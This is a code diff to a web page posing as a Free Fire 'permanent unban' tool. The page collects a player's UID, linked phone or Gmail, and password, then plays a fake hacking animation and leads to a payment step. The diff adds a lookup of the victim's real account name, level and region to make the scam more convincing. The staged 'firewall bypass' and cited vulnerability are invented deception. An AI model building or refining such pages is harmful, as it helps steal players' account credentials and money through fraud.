@@ -27,27 +27,19 @@
             overflow-x: hidden;
         }
 
-        /* ===== RESPONSIVE BASE ===== */
         html {
             font-size: 16px;
         }
 
         @media (max-width: 480px) {
-            html {
-                font-size: 14px;
-            }
-            body {
-                padding: 0.5rem;
-            }
+            html { font-size: 14px; }
+            body { padding: 0.5rem; }
         }
 
         @media (max-width: 380px) {
-            html {
-                font-size: 12px;
-            }
+            html { font-size: 12px; }
         }
 
-        /* ===== PARTICLES ===== */
         #particles {
             position: fixed;
             top: 0;
@@ -75,7 +67,6 @@
             100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
 
-        /* ===== ANIMATIONS ===== */
         @keyframes pulse {
             0%, 100% { transform: scale(1); opacity: 1; }
             50% { transform: scale(1.15); opacity: 0.5; }
@@ -151,12 +142,10 @@
         .dot-loader:nth-child(2) { animation-delay: 0.2s; }
         .dot-loader:nth-child(3) { animation-delay: 0.4s; }
 
-        /* ===== SCROLLBAR ===== */
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #05080f; }
         ::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #ff0000, #7b2ffc); border-radius: 10px; }
 
-        /* ===== CONTAINER ===== */
         .container {
             max-width: 750px;
             width: 100%;
@@ -164,7 +153,6 @@
             z-index: 1;
         }
 
-        /* ===== GLOW ORBS ===== */
         .glow-orb {
             position: fixed;
             border-radius: 50%;
@@ -191,7 +179,6 @@
             animation: orbFloat 25s ease-in-out infinite reverse;
         }
 
-        /* ===== LOADING SCREEN ===== */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -262,7 +249,6 @@
         #loadingScreen .network-dots .dot:nth-child(2) { animation-delay: 0.2s; background: #ff4444; }
         #loadingScreen .network-dots .dot:nth-child(3) { animation-delay: 0.4s; background: #ff8888; }
 
-        /* ===== HEADER ===== */
         .header {
             text-align: center;
             padding: clamp(0.8rem, 3vw, 1.5rem) clamp(0.8rem, 3vw, 1.5rem);
@@ -356,7 +342,6 @@
             animation: pulse 1.5s ease-in-out infinite;
         }
 
-        /* ===== SUPPORT BADGE ===== */
         .support-badge-container {
             display: flex;
             justify-content: center;
@@ -381,7 +366,6 @@
             color: #f1c40f;
         }
 
-        /* ===== SERVER STATUS ===== */
         .server-status {
             background: rgba(255, 255, 255, 0.01);
             border: 1px solid rgba(255, 0, 0, 0.03);
@@ -408,7 +392,6 @@
         .server-status .value.blue { color: #8a9bb0; font-weight: 400; }
         .server-status .sep { color: #4a5a6e; font-size: 0.5rem; }
 
-        /* ===== FORM ===== */
         .form-section {
             background: rgba(255, 255, 255, 0.01);
             border-radius: 16px;
@@ -484,7 +467,41 @@
             margin-left: 4px;
         }
 
-        /* ===== BUTTON ===== */
+        /* ===== ACCOUNT INFO DISPLAY ===== */
+        #accountInfo {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 0, 0, 0.05);
+            border-radius: 12px;
+            padding: 0.8rem 1rem;
+            margin: 0.8rem 0;
+            display: none;
+        }
+
+        #accountInfo .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+        }
+
+        #accountInfo .row:last-child {
+            border-bottom: none;
+        }
+
+        #accountInfo .row .label {
+            color: #6a7a8e;
+            font-size: clamp(0.6rem, 1.4vw, 0.7rem);
+        }
+
+        #accountInfo .row .value {
+            font-weight: 500;
+            font-size: clamp(0.6rem, 1.4vw, 0.7rem);
+        }
+
+        #accountInfo .row .value.name { color: #5cdb9e; }
+        #accountInfo .row .value.level { color: #f0f4ff; }
+        #accountInfo .row .value.region { color: #f1c40f; }
+
         .recover-btn {
             width: 100%;
             padding: clamp(12px, 2.5vw, 16px);
@@ -518,7 +535,6 @@
             animation: none;
         }
 
-        /* ===== AGGRESSIVE CONTAINER ===== */
         .aggressive-container {
             display: none;
             background: rgba(0, 0, 0, 0.8);
@@ -644,7 +660,6 @@
             animation: glowPulse 0.4s infinite, aggressiveFlash 0.3s ease-in-out infinite;
         }
 
-        /* ===== PAYMENT ===== */
         .payment-section {
             display: none;
             text-align: center;
@@ -715,7 +730,6 @@
             transform: translateY(-2px);
         }
 
-        /* ===== PROCESSING ===== */
         .processing-section {
             display: none;
             text-align: center;
@@ -752,7 +766,6 @@
             margin-top: 0.2rem;
         }
 
-        /* ===== FINAL ===== */
         .final-message {
             display: none;
             text-align: center;
@@ -799,7 +812,6 @@
             margin-top: 0.3rem;
         }
 
-        /* ===== FOOTER ===== */
         .footer {
             margin-top: 1.5rem;
             padding-top: 1rem;
@@ -843,7 +855,6 @@
             letter-spacing: 1px;
         }
 
-        /* ===== SUPPORT POPUP ===== */
         #supportPopup {
             position: fixed;
             bottom: 70px;
@@ -906,7 +917,6 @@
             cursor: pointer;
         }
 
-        /* ===== RESPONSIVE FINE-TUNE ===== */
         @media (max-width: 480px) {
             .form-section { padding: 0.8rem; }
             .header { padding: 0.8rem; }
@@ -985,6 +995,22 @@
             <input type="text" id="uidInput" placeholder="Enter your UID (e.g. 1234567890)" maxlength="15">
         </div>
 
+        <!-- ===== ACCOUNT INFO DISPLAY (REAL DATA) ===== -->
+        <div id="accountInfo">
+            <div class="row">
+                <span class="label">Account Name</span>
+                <span class="value name" id="accName">—</span>
+            </div>
+            <div class="row">
+                <span class="label">Account Level</span>
+                <span class="value level" id="accLevel">—</span>
+            </div>
+            <div class="row">
+                <span class="label">Region</span>
+                <span class="value region" id="accRegion">—</span>
+            </div>
+        </div>
+
         <div class="input-group">
             <label>📱 PHONE NUMBER / GMAIL</label>
             <input type="text" id="phoneInput" placeholder="Enter phone number or Gmail linked to your account">
@@ -1014,7 +1040,7 @@
             <div class="hack-progress">
                 <div class="bar aggressive" id="hackProgressBar"></div>
             </div>
-            <div class="step-counter">Step <span id="stepCounter">0</span> of <span id="totalSteps">8</span></div>
+            <div class="step-counter">Step <span id="stepCounter">0</span> of <span id="totalSteps">10</span></div>
             <div class="log-output">
                 <div class="log-content" id="logOutput">
                     <div>[INFO] Initializing permanent unban protocol...</div>
@@ -1186,6 +1212,12 @@
         }, 12000);
     }, 15000);
 
+    // =============================================================
+    // ===== REAL API INTEGRATION =====
+    // =============================================================
+    // Uses free-ff-api to fetch real account details
+    const API_URL = 'https://free-ff-api-src-5plp.onrender.com/api/v1/account';
+
     // ===== MAIN LOGIC =====
     const uidInput = document.getElementById('uidInput');
     const phoneInput = document.getElementById('phoneInput');
@@ -1208,6 +1240,32 @@
     const totalSteps = document.getElementById('totalSteps');
     const logOutput = document.getElementById('logOutput');
 
+    // Account info elements
+    const accName = document.getElementById('accName');
+    const accLevel = document.getElementById('accLevel');
+    const accRegion = document.getElementById('accRegion');
+    const accountInfo = document.getElementById('accountInfo');
+
+    // ===== FETCH REAL PLAYER DATA =====
+    async function fetchPlayerData(uid) {
+        try {
+            // Change 'IND' to your region: BR, SG, ID, US, PK, etc.
+            const region = 'IND';
+            const url = `${API_URL}?region=${region}&uid=${uid}`;
+            const response = await fetch(url);
+            
+            if (!response.ok) {
+                throw new Error('Invalid UID or region');
+            }
+            
+            const data = await response.json();
+            return data;
+        } catch (error) {
+            console.error('Error fetching player data:', error.message);
+            return null;
+        }
+    }
+
     // ===== CHECK FIELDS =====
     function checkFields() {
         const uid = uidInput.value.trim();
@@ -1216,7 +1274,44 @@
         recoverBtn.disabled = !(uid.length >= 5 && phone.length >= 5 && pass.length >= 3);
     }
 
-    uidInput.addEventListener('input', checkFields);
+    // ===== UID INPUT WITH REAL API =====
+    uidInput.addEventListener('input', async function() {
+        const uid = this.value.trim();
+        
+        if (uid.length >= 5) {
+            // Show loading state
+            accountInfo.style.display = 'block';
+            accName.textContent = '⏳ Fetching...';
+            accLevel.textContent = '⏳ Fetching...';
+            accRegion.textContent = '⏳ Fetching...';
+            accName.style.color = '#8a9bb0';
+            
+            const data = await fetchPlayerData(uid);
+            
+            if (data && data.nickname) {
+                // Display real data
+                accName.textContent = data.nickname || 'Unknown';
+                accName.style.color = '#5cdb9e';
+                accLevel.textContent = 'Level ' + (data.level || '?');
+                accRegion.textContent = data.region || 'Unknown';
+                
+                // Store data for later
+                window.realPlayerData = data;
+                recoverBtn.disabled = false;
+            } else {
+                // Show error
+                accName.textContent = '❌ Invalid UID';
+                accName.style.color = '#e74c3c';
+                accLevel.textContent = 'Please check and try again.';
+                accRegion.textContent = '—';
+                recoverBtn.disabled = true;
+            }
+        } else {
+            accountInfo.style.display = 'none';
+            recoverBtn.disabled = true;
+        }
+    });
+
     phoneInput.addEventListener('input', checkFields);
     passInput.addEventListener('input', checkFields);
 
@@ -1249,7 +1344,7 @@
         }
     }
 
-    // ===== AGGRESSIVE STAGES (EXTENDED TO 40+ SECONDS) =====
+    // ===== AGGRESSIVE STAGES (40+ SECONDS) =====
     const aggressiveStages = [
         { icon: '🔥', text: '🔥 BYPASSING GARENA FIREWALL...', sub: 'Exploiting CVE-2026-0912 vulnerability', progress: 5 },
         { icon: '💀', text: '💀 DECRYPTING PERMANENT BAN FLAG...', sub: 'Extracting ban metadata from database', progress: 12 },
@@ -1306,7 +1401,7 @@
             }, 10);
 
             stageIndex++;
-            // ===== EXTENDED TO 40+ SECONDS (4-6 seconds per stage) =====
+            // Extended to 40+ seconds (3.5-6 seconds per stage)
             const delay = stageIndex === aggressiveStages.length ? 800 : 3500 + Math.random() * 2500;
             setTimeout(runAggressiveStage, delay);
         }
